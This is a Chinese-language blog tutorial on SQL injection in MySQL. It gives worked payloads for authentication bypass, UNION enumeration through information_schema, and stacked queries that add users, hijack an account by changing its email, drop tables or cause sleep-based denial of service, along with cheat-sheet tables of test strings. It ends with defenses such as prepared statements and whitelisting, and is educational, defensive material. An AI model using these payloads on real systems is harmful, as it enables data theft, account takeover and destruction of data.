title: SQL注入攻击示例与防范措施
author: tinker
tags:
  - SQL注入
  - Web安全
categories: []
date: 2020-03-28 16:48:00
---
注入攻击是OWASP总结的十大web安全风险中排在第一位的攻击形式， 而SQL注入(SQL Injection)攻击是注入攻击中最常见的一种形式。SQL注入漏洞可以从数据库读取敏感数据，修改数据库数据（插入/更新/删除），对数据库执行管理操作（例如关闭DBMS），恢复DBMS文件上存在的给定文件的内容系统，并在某些情况下向操作系统发出命令。

作为开发要防范这些攻击，就需要了解这些攻击方式。现列出Mysql数据库下几种常见SQL注入攻击示例，以作参考。

## 注入示例

### 检索出隐藏数据

假定某一购物应用，支持返回某类别下且已上线商品，当用户单击“礼物”类别时，其浏览器将请求URL：`https://www.cyub.vip/products?category=Gifts`

```php
SELECT * FROM products WHERE category = '$_GET["category"]' AND online = 1
```

这时候攻击者可以通过以下请求来获取该分类下所有商品信息(含未上线数据)：

`https://www.cyub.vip/products?category=Gifts'--`

此时执行SQL将会是：

> SELECT * FROM products WHERE category = '<font color="red"><b>Gifts' -- </b></font>' AND online = 1


`--`是mysql行注释符，会忽略其后面的语句。上面语句将忽略掉`AND online=1`部分，从而返回所有商品信息。`#`也是mysql的行注释符，也可以使用`#`来达到同样目的

> SELECT * FROM products WHERE category = '<font color="red"><b>Gifts' #</b></font>' AND online = 1


其他能达到此攻击目的的方式还有：

> SELECT * FROM products WHERE category = '<font color="red"><b>Gifts' OR 1=1--</b></font>' AND online = 1

> SELECT * FROM products WHERE category = '<font color="red"><b>Gifts' OR 1='1'</b></font>' AND online = 1

### 颠覆应用逻辑

假定一用户系统，存储用户账号和密码，密码以md5形式存储。登录时候处理逻辑如下，查询用户账号和密码是否匹配，匹配则登录成功：

```
SELECT * FROM members WHERE username='$POST["username"]' AND passwd=md5($POST["userpwd"]);
```
这时候如果如下进行注入，可以成功使用admin身份登录。

> SELECT * FROM members WHERE username='<font color="red"><b>admin' --</b></font>' AND passwd=md5(123456);




### 获取数据库类型，表名称字段等信息

假定一购物应用返回商品详细信息，访问URL：`https://www.cyub.vip/product?id=123`，业务代码处理逻辑如下：

```php
SELECT * FROM products WHERE id = $_GET['id']
```

#### 获取数据库类型与版本

此时可以通过构造出如下SQL来检查数据库是不是MYSQL,版本是不是5.7

> SELECT * FROM products WHERE id = <font color="red"><b>123 AND mid(version(),1,3) = 5.7</b></font>

此时若能正常返回商品信息，则说明数据库是MYSQL，且版本是5.7


#### 获取数据表字段数

通过第n个字段排序来判断表中字段数:

> SELECT * FROM products WHERE id = <font color="red"><b>123 ORDER BY 10 DESC</b></font>

若能正常返回，说明表products字段数在大于或等于10个，错误则说明表products字段数小于10个。通过此方式不断测试可以推断出来表中字段数。

或者通过union来判断表中字段数:

> > SELECT * FROM products WHERE id = <font color="red"><b>123 UNION SELECT 0,1,2,3,4,5,6,7,8,9</b></font>

#### 获取数据库名称和当前用户名称

在获取数据表字段数之后，可以通过`union`来获取当前数据库名称和当前用户名称

> SELECT * FROM `products` WHERE id= <font color="red"><b>123 and 1=2 union select 1,version(),user(),database()</b></font>

### 判断表或字段是否存在

#### 判断表是否存在
> SELECT * FROM `products` WHERE id= <font color="red"><b>123 AND 1<=(SELECT count(*) FROM members)</b></font>


若正常返回商品信息，则说明表member存在，否则表不存在，该语句会执行错误

除上面方法外，还可以通过union来判断表是否存在:

> SELECT * FROM `products` WHERE id= <font color="red"><b>123 AND 1=2 UNION select 1,2,3,4 FROM members</b></font>


#### 判断字段是否存在

通过如下方式，可以判断字段`name`是否存在:

> SELECT * FROM `products` WHERE id= <font color="red"><b>123 AND name is null</b></font>


### 获取所有数据库名称和表名

Mysql中`information_schema`数据库存储着数据库信息和数据库表信息。通过union攻击方式，可以获取该数据库中存储信息

比如获取所有DB名称：

> SELECT * FROM `products` WHERE id= <font color="red"><b>123 AND 1=2 UNION SELECT 1,2,3,SCHEMA_NAME FROM information_schema.schema LIMIT 0, 1</b></font>

比如获取所有数据表信息：

> SELECT * FROM `products` WHERE id= <font color="red"><b>123 AND 1=2 UNION SELECT 1,2,SCHEMA_NAME, TABLE_NAME FROM information_schema.tables LIMIT 0, 1</b></font>


比如获取表members所有字段信息：

> SELECT * FROM `products` WHERE id= <font color="red"><b>123 AND 1=2 UNION SELECT 1,2,3, COLUMN_NAME FROM information_schema.columns WHERE table_name='members' LIMIT 0, 1</b></font>


### 新增/更改/删除数据

通过批量查询功能，可以达到数据新增、更新，删除等攻击目的。使用上面获取商品隐藏数据的场景，来举例说明：

#### 新增数据

> SELECT * FROM products WHERE category = '<font color="red"><b>Gifts'; INSERT INTO members ('name', 'email','passwd') 
        VALUES ('tink','tink@cyub.vip',md5('123456')); -- </b></font>' AND online = 1

通过插入一条数据到member表中，达到成为管理员目的。

#### 更改数据

通过把tink的邮箱地址更换掉，然后使用邮箱找回密码功能，来获取此账号。

> SELECT * FROM products WHERE category = '<font color="red"><b>Gifts'; UPDATE members set email="hacker@example.com" WHERE name="tink" ; -- </b></font>' AND online = 1


#### 删除数据

比如DROP掉数据表members

> SELECT * FROM products WHERE category = '<font color="red"><b>Gifts'; DROP TABLE members ; -- </b></font>' AND online = 1

### 时延攻击

通过SQL语句中注入sleep语句，然后大量请求，会导致mysql连接被大量占用从而达到攻击系统的目的。使用上面获取商品隐藏数据的场景，来举例说明：

> SELECT * FROM products WHERE category = '<font color="red"><b>Gifts';SELECT sleep(10) ; -- </b></font>' AND online = 1


## 注入方式总结

### 内联SQL注入(Inline SQL Injection)

内联注入是指向查询注入SQL代码后，原来的查询仍然会全部执行，分为两种：

1. 字符串内联注入

	首先是通过引发异常来判断是否有SQL漏洞，然后构思一条有效地SQL语句，该语句应能满足应用施加的条件一边绕过身份验证控制；
    
    
示例：

```
SELECT * FROM members WHERE username = '' OR '1'='1' AND password = '';
SELECT * FROM members WHERE (username = '' OR '1'='1') AND (password = '');
```

可用注入字符串特征值：

测试字符串|变种|预期结果
--- | --- | ---
' |  | 触发错误。如果成功，数据库返回错误信息
1' OR '1'='1 |	1') OR ('1'='1 | 永真条件，如果成功，将返回表中所有行
value' OR '1'='2 | value') OR ('1'='2 | 空条件，如果成功，将会返回和原来语句一样的结果
1' AND '1'='2	| 1')  AND ('1'='2 |永假条件，如果成功，将不返回表中所有行
1' OR 'ab'='a''b	| 1') OR ('ab'='a' 'b |	MySQL 字符串连接。如果成功，将返回与永真条件相同的信息

2. 数字值内联注入

	跟字符串内联注入方式一样也是通过异常来判断是否有SQL漏洞。

可用注入数字特征值：

测试字符串| 变种|预期结果
---|---|---
'	| | 触发错误。如果成功，数据库返回错误信息
1+1	| 3-1	| 如果成功，将返回与操作结果相同的值
value+0	| | 如果成功，将返回与操作结果相同的值
1 OR 1=1	| 1) OR (1=1	| 永真条件。如果成功，将返回表中所有行
value OR 1=2 | value) OR (1=2 | 空条件，如果成功，将会返回和原来语句一样的结果
1 AND 1=2 | 1) AND (1=2	| 永假条件，如果成功，将不返回表中所有行
1 OR 'ab'='a' 'b | 1) OR ('ab'='a' 'b	| MySQL 字符串连接。如果成功，将返回与永真条件相同的信息

### 终止式SQL注入

终止式SQL注入是指攻击者在注入SQL代码时，通过将原查询语句的剩余部分注释掉，从而成功结束原来的查询语句

#### 数据库注释语法

数据库 | 注释 | 描述
---- |--- |---
SQL Server,Oracle,PostgreSQL |--	| 用于单行注释
SQL Server,Oracle,PostgreSQL |	/* */	| 用于多行注释
MySQL	|--	| 用于单行注释，第二个连字符后面需要加一个空格或控制字符(制表符、换行符)
MySQL	| #	|用于单行注释
MySQL	| /* */	| 用于多行注释


可用注释语句特征值：

测试字符串	| 变种 |预期结果
---|---|---|
admin'-- | admin')-- |通过返回数据库中的 admin 行来绕过验证
admin'#	| admin')#	| MySQL 通过返回数据库中的 admin 行来绕过验证
1--	| 1)--	| 注释掉剩下的查询，希望能够清除可注入参数后面 WHERE 子句指定的过滤
1 OR 1=1--	| 1) OR 1=1-- | 注入一个数字参数，返回所有行
' OR '1'='1'--	| ') OR '1'='1'-- | 注入一个字符串参数，返回所有行
-1 AND 1=2-- | -1) AND 1=2	| 注入一个数字参数，不返回任何行
' AND '1'='2'--	| ') AND '1'='2'-- |	注入一个字符串参数，不返回任何行
1 /\*注释\*/ | |		将注入注释掉。如果成功，将不会对请求产生任何影响。有助于识别 SQL 注入

####  堆叠查询(Stacked Query)

堆叠查询是指通过注入多条语句，可以达到同时执行多条语句的目的。

可用注入多条语句特征值列表：

测试字符串	| 变种	| 预期结果
---|---|---
';[SQL Statement];-- |	);[SQL Statement];-- |	注入一个字符串参数，执行多条语句
';[SQL Statement];# |	');[SQL Statement];#	| MySQL 注入一个字符串参数，执行多条语句
;[SQL Statement];-- |	);[SQL Statement];-- | 注入一个数值参数，执行多条语句
;[SQL Statement];#	| );[SQL Statement];# | MySQL 注入一个数值参数，执行多条语句


## 阻止SQL注入攻击

### 使用预处理语句和参数绑定

```php
$calories = 150;
$colour = 'red';
$sth = $dbh->prepare('SELECT name, colour, calories
    FROM fruit
    WHERE calories < :calories AND colour = :colour');
$sth->bindParam(':calories', $calories, PDO::PARAM_INT);
$sth->bindParam(':colour', $colour, PDO::PARAM_STR, 12);
$sth->execute();
```

### 使用存储过程

```java
String custname = request.getParameter("customerName"); 
try {
  CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
  cs.setString(1, custname);
  ResultSet results = cs.executeQuery();      
  // … result set handling 
} catch (SQLException se) {           
  // … logging and error handling
}
```

### 使用白名单机制

```
String tableName;
switch(PARAM):
  case "Value1": tableName = "fooTable";
                 break;
  case "Value2": tableName = "barTable";
                 break;
  ...
  default      : throw new InputValidationException("unexpected value provided" 
                                                  + " for table name");
```

### 永远不要信任客用户提交的数据，转义过滤任何用户提交的数据

```
Encoder oe = new OracleEncoder();
String query = "SELECT user_id FROM user_data WHERE user_name = '" 
+ oe.encode( req.getParameter("userID")) + "' and user_password = '" 
+ oe.encode( req.getParameter("pwd")) +"'";
```

### 系统上线前进行SQL盲注测试

在项目上线前，使用sqlmap等盲注工具，进行盲注测试，提前发现潜在漏洞，即时修补


## 参考来源

- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
- [SQL injection](https://portswigger.net/web-security/sql-injection)
- [SQL Injection Attacks by Example](http://www.unixwiz.net/techtips/sql-injection.html)
- [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PHP项目中安全风险与防范](https://www.cyub.vip/2018/06/28/PHP%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E4%B8%8E%E9%98%B2%E8%8C%83/)
- [web攻击之三：SQL注入攻击的种类和防范手段](https://www.cnblogs.com/duanxz/p/4898130.html)